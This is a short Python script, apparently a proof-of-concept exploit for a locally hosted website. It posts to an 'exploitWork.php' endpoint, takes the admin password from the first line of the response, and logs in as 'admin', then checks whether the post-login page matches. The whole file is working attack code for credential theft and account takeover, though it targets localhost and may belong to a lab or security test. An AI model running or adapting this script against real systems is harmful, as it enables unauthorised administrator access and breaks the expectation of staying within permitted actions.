import requests
EXPECTED = "<!DOCTYPE html><html lang=\"en\" style=\"background-color: white;\"><head><link href=\"../main.css\" rel=\"stylesheet\"></head><body><div><p>Login</p><a href=\"../../index.html\"><button>Continue to site</button></a></div></body></html>"

SESSION = requests.Session()

PATH_EXPLOIT = 'http://localhost/site/data/users/exploitWork.php'
ADMIN = SESSION.post(PATH_EXPLOIT)

DATA = ADMIN.text
LINES = DATA.split("\n")

PATH_LOGIN = 'http://localhost/site/data/login.php'
LOGIN_INFO = {'username': 'admin', 'password': LINES[0]}
LOGIN = SESSION.post(PATH_LOGIN, data=LOGIN_INFO)

if EXPECTED == LOGIN.text:
    print("Admin login success!")
else:
    print("Admin login fail")